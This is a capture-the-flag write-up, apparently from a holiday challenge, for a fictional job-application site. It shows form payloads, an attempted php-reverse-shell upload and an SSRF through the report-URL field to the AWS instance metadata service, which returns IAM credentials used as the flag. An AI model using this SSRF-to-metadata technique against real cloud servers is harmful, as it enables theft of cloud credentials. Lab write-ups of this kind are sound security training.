# Introduction
This is a challenge that I truely do reccomend doing. It teaches you something about AWS IMDS, something that is compleatly new to me. I suggest reading this page first to grasp a better understanding of what we are actually doing on the serverside. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
The description for the challenge is: *What is the secret access key for the Jack Frost Tower job applications server? Brave the perils of Jack's bathroom to get hints from Noxious O. D'or.*
So we are after a secret key.

# Recon
The current target is this webpage: https://apply.jackfrosttower.com/. A simple nmap scan did reveal several open ports, but none of those will be used in this write up.
The page is simple and lets you apply to join the Jack Frost team. The four pages are Home, Opportunities, Apply or About. Dirb did find https://apply.jackfrosttower.com/images/, the dir itself is 403 forbidden, but manually finding pictures there is allowed. I'll save that for later. 
Further enumeration surronding media on the site shows that the photos under opportunity are broken and have no data. Strange, but might help. 
The apply application lets you upload files and asks for Name, Email, Phone number, URL to NLBI report and additional information. 
What is a NLBI report? http://nppd.northpolechristmastown.com/
It's a report athat you are injustly set on the naughty list. I'm guessing it does a check up against that url to see if the user is allowed to apply.

So to summerize:
- We can most likely send the server to an url
- We can upload files
- We can manually check for images in the image folder if we know the name

We need to send something in the form to check the output, additionally I will start burp to make it easier to enumerate via the repeater.
I like to put unique values to see where they end up. By that we can easier understand what gave what error.
The email form didn't like that i added chars that were illegal, but thats on the clientside. Just edit the form with inspector to change the type field from email to text and you're good to go.
```
Name=Beans'
Email=TGC@nowhere.com--
Phone number:123123
Field of Expertise=Aggravated pulling of hair
Resume=php-reverse-shell.php (this file will not call back to me sience it is coded to a 192.168 address, but I wan't to see what happens).
URL to your public NLBI report = http://nppd.northpolechristmastown.com/infractions 
Additional information = Give root pls
```
With these parameters I only recive a submission recived. I can't find our data anywhere, so this must not be it.
I'm going to try IMDS to see what we recive:
```
Name=Beans'
Email=TGC@nowhere.com--
Phone number:123123
Field of Expertise=Aggravated pulling of hair
Resume=php-reverse-shell.php (this file will not call back to me sience it is coded to a 192.168 address, but I wan't to see what happens).
URL to your public NLBI report = http://169.254.169.254/latest/meta-data/
Additional information = Give root pls
```
This results in a new page! It tells us that they will be in touch. And we see a picture that is broken. But upon inspecting the picture, we seee that there is data in it. I downloaded it and tried to read the output. It resulted in the following:
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/ami
block-device-mapping/ebs0
block-device-mapping/ephemeral0
block-device-mapping/root
block-device-mapping/swap
elastic-inference/associations
elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1
events/maintenance/scheduled
events/recommendations/rebalance
hostname
iam/info
iam/security-credentials
iam/security-credentials/jf-deploy-role
instance-action
instance-id
instance-life-cycle
instance-type
latest
latest/api/token
local-hostname
local-ipv4
mac
network/interfaces/macs/0e:49:61:0f:c3:11/device-number
network/interfaces/macs/0e:49:61:0f:c3:11/interface-id
network/interfaces/macs/0e:49:61:0f:c3:11/ipv4-associations/192.0.2.54
network/interfaces/macs/0e:49:61:0f:c3:11/ipv6s
network/interfaces/macs/0e:49:61:0f:c3:11/local-hostname
network/interfaces/macs/0e:49:61:0f:c3:11/local-ipv4s
network/interfaces/macs/0e:49:61:0f:c3:11/mac
network/interfaces/macs/0e:49:61:0f:c3:11/owner-id
network/interfaces/macs/0e:49:61:0f:c3:11/public-hostname
network/interfaces/macs/0e:49:61:0f:c3:11/public-ipv4s
network/interfaces/macs/0e:49:61:0f:c3:11/security-group-ids
network/interfaces/macs/0e:49:61:0f:c3:11/security-groups
network/interfaces/macs/0e:49:61:0f:c3:11/subnet-id
network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv4-cidr-block
network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv6-cidr-blocks
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-id
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-block
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-blocks
network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv6-cidr-blocks
placement/availability-zone
placement/availability-zone-id
placement/group-name
placement/host-id
placement/partition-number
placement/region
product-codes
public-hostname
public-ipv4
public-keys/0/openssh-key
reservation-id
security-groups
services/domain
services/partition
spot/instance-action
spot/termination-time
```
So our query succeeded! We are using SSRF and IMDS to retrive information about the backend. Well, our goal is to retrive the public key, so lets do that!

# Exploitation
I used the following payload for my exploit:
```
Name=Beans'
Email=TGC@nowhere.com--
Phone number:123123
Field of Expertise=Aggravated pulling of hair
Resume=
URL to your public NLBI report = http://169.254.169.254/latest/meta-data/iam/security-credentials
Additional information = Give root pls
```
**The result**
```
{
        "Code": "Success",
        "LastUpdated": "2021-05-02T18:50:40Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
        "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
        "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
        "Expiration": "2026-05-02T18:50:40Z"
}
```

And there we got our flag!

# Final thoughts
I'm not sure how real world this is by having the results put into a picture. But the creativity makes it so much more fun.
If you want to do this in burp you can, then you have to go to the images subpage we found earlier and get them from there.
